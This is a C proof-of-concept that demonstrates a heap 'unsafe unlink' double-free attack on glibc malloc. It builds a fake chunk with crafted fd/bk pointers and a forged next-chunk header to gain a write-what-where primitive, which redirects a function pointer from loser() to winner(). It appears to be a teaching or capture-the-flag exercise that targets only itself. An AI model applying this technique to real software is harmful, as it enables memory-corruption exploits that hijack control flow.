#include  <stdlib.h>
#include  <string.h>
#include  <stdio.h>
#include  <assert.h>


#define Pointer int*

#define CHUNK_SIZE   128
#define CHUNK_NUM    10



void(*who_are_you)();

void loser()
{
    printf("you are loser!\n");
}

/* can you call winnner*/
void winner()
{
    printf("you are winner!\n");
}


int doublefree()
{
    void* ptrList[CHUNK_NUM];
    void* p;
    int i;
    Pointer *fake_chunk, *next_chunk;
    int prev_size, size;
    Pointer fd, bk;
  
    printf("ptrList = %p\n",ptrList);
    
    for(i=0;i<CHUNK_NUM;i++) {
        ptrList[i] = malloc(CHUNK_SIZE - sizeof(Pointer)*2);
        printf("%p  =>  ptrList[%02d] = %p\n", &ptrList[i] ,i , ptrList[i]);    
    }
   
    getchar();
    free(ptrList[3]);
    free(ptrList[4]);
    p = malloc(CHUNK_SIZE*2 - sizeof(Pointer)*2);
    assert(p == ptrList[3]);
    ptrList[3] = p;
    printf("ptrList[03] = %p\n",ptrList[3]);    
    
    /* fake chunk */
    fake_chunk = (Pointer*)(ptrList[3]) ;
    prev_size = 0;
    size = CHUNK_SIZE -  sizeof(Pointer)*2 + 1;    // LBS must be 0 that indicates that the fake chunk is in used!
    fd = (Pointer)&ptrList[3] - 3 ;
    printf("fd = %p\n", fd);    
    bk = (Pointer)&ptrList[3] - 2 ;
    printf("bk = %p\n", bk);    
    fake_chunk[0] = prev_size;                 // prev_size
    fake_chunk[1] = size;    // size
    fake_chunk[2] = fd;      // forward chunk pointer  [next chunk]
    fake_chunk[3] = bk;      // backward chunk pointer [previous chunk]
    printf("fake_chunk = %p\n", fake_chunk);    

    /* fake next chunk prev_size And Size */
    next_chunk = (Pointer*)(ptrList[4] - sizeof(Pointer)*2);
    printf("next_chunk = %p\n", next_chunk);    
    next_chunk[0] = size -1;
    next_chunk[1] = CHUNK_SIZE;
    
    /* double free next chunk */
    getchar();
    free(ptrList[4]);
    printf("double free!\n");

    /* write what where */
    getchar();
    char * where;
    char * what;
    
    where = &who_are_you;
    what = &winner;
    *((Pointer)ptrList[3]) = where;
    *((Pointer)ptrList[0]) = what;

}        




int main(int argc, char *argv[])
{
    who_are_you = loser;

    doublefree();

    who_are_you();

}        




